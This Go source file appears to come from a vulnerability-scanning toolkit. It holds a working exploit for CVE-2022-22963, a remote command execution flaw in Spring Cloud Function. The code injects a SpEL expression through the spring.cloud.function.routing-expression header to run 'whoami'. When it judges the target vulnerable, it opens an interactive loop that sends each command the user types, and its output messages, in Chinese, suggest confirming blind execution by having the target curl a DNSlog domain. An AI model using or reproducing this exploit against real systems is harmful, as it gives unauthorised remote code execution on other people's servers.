package exppackage

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"github.com/fatih/color"
	"net"
	"net/url"
	"os"
	"ssp/common"
	"strings"
)

func CVE_2022_22963(targetURL string) {
	parsedURL, err := url.Parse(targetURL)
	if err != nil {
		fmt.Println("URL parsing error:", err)
	}

	requestHeaders := []string{
		fmt.Sprintf("POST %s HTTP/1.1", "/functionRouter"),
		fmt.Sprintf("Host: %s", parsedURL.Host),
		"Accept-Encoding: gzip, deflate",
		"Accept: */*",
		"Accept-Language: en",
		"User-Agent: Go-http-client/1.1",
		"Content-Type: application/x-www-form-urlencoded",
		"spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"whoami\")",
		"Connection: close",
		"",
		"",
	}

	var conn net.Conn
	if parsedURL.Scheme == "https" {
		conn, err = tls.Dial("tcp", parsedURL.Host, &tls.Config{InsecureSkipVerify: true})
	} else {
		conn, err = net.Dial("tcp", parsedURL.Host)
	}
	if err != nil {
		fmt.Println("Connection error:", err)
	}
	defer conn.Close()

	request := strings.Join(requestHeaders, "\r\n")
	_, err = conn.Write([]byte(request))
	if err != nil {
		fmt.Println("Failed to send request:", err)
	}

	response, err := bufio.NewReader(conn).ReadString('\n')
	if err != nil {
		fmt.Println("Failed to read response:", err)
	}

	if strings.Contains(response, "500 Internal Server Error") {
		common.PrintVulnerabilityConfirmation("CVE-2022-22963", targetURL, "存在漏洞，由于该漏洞无回显，请用Dnslog进行测试,shell中输入curl xxx.dnslog.cn", "4")
		common.Vulnum++
		for {
			var Cmd string
			reader := bufio.NewReader(os.Stdin)

			fmt.Print("shell > ")
			Cmd, _ = reader.ReadString('\n')
			Cmd = strings.TrimSpace(Cmd)
			if Cmd == "exit" {
				os.Exit(0)
			}
			requestHeaders = []string{
				fmt.Sprintf("POST %s HTTP/1.1", "/functionRouter"),
				fmt.Sprintf("Host: %s", parsedURL.Host),
				"Accept-Encoding: gzip, deflate",
				"Accept: */*",
				"Accept-Language: en",
				"User-Agent: Go-http-client/1.1",
				"Content-Type: application/x-www-form-urlencoded",
				fmt.Sprintf("spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec(\"%s\")", Cmd),
				"Connection: close",
				"",
				"",
			}

			if parsedURL.Scheme == "https" {
				conn, err = tls.Dial("tcp", parsedURL.Host, &tls.Config{InsecureSkipVerify: true})
			} else {
				conn, err = net.Dial("tcp", parsedURL.Host)
			}
			if err != nil {
				fmt.Println("Connection error:", err)
			}
			defer conn.Close()

			request := strings.Join(requestHeaders, "\r\n")
			_, err = conn.Write([]byte(request))
			if err != nil {
				fmt.Println("Failed to send request:", err)
			}
			color.Red("Payload 已打出，请到Dnslog平台查看结果\n")
		}
	} else {
		color.Yellow("[-] %s 未发现CVE-2022-22963远程命令执行漏洞\n", targetURL)
	}

}
